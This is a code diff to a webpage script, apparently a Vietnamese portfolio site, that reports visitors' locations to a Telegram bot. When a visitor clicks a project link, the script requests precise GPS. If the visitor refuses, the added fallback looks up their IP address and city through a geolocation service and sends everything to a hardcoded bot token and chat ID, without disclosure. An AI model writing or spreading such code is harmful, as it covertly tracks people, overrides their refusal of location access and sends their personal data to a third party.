@@ -325,9 +325,9 @@ document.addEventListener("DOMContentLoaded", function () {
 const TELEGRAM_BOT_TOKEN = '8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU';
 const TELEGRAM_CHAT_ID = '6149032213';
 
-function sendLocationToTelegram(lat, lng) {
+function sendLocationToTelegram(lat, lng, info = '') {
   const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-  const message = `🚨 CÓ NGƯỜI ĐANG XEM DỰ ÁN CỦA BẠN!\n📍 Vị trí: ${mapLink}`;
+  const message = `🚨 CÓ NGƯỜI ĐANG XEM DỰ ÁN CỦA BẠN!\n📍 Vị trí: ${mapLink}${info}`;
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
 
   fetch(url).catch(err => console.error("Lỗi gửi Telegram:", err));
@@ -339,25 +339,40 @@ document.querySelectorAll('.project-btn').forEach(btn => {
     const targetUrl = this.getAttribute('href');
     const targetWindow = this.getAttribute('target') || '_self';
 
-
     window.open(targetUrl, targetWindow);
 
+    // Hàm dự phòng: lấy vị trí qua IP nếu không lấy được GPS
+    const fallbackToIP = () => {
+      fetch('https://get.geojs.io/v1/ip/geo.json')
+        .then(res => res.json())
+        .then(data => {
+          const info = `\n🌎 Vùng (Lấy theo IP): ${data.city || 'Không rõ'}, ${data.region || 'Không rõ'}, ${data.country || 'Không rõ'}\n🌐 IP: ${data.ip}\n🔗 Project: ${targetUrl}`;
+          sendLocationToTelegram(data.latitude || 0, data.longitude || 0, info);
+        })
+        .catch(err => console.error("Lỗi lấy vị trí IP:", err));
+    };
 
+    // Ưu tiên xin quyền GPS trước để có độ chính xác cao nhất
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
+          const info = `\n🎯 Vị trí chính xác (Lấy theo GPS)\n🔗 Project: ${targetUrl}`;
+          sendLocationToTelegram(position.coords.latitude, position.coords.longitude, info);
         },
         (error) => {
-          console.log("Khách từ chối cấp quyền GPS hoặc lỗi: ", error.message);
+          console.log("Khách từ chối GPS hoặc lỗi timeout, chuyển sang dò bằng IP...", error.message);
+          fallbackToIP();
         },
         {
-          timeout: 10000,
+          timeout: 8000,
           maximumAge: 60000,
-          enableHighAccuracy: false
+          enableHighAccuracy: true
         }
       );
+    } else {
+      fallbackToIP();
     }
   });
 });
+
 
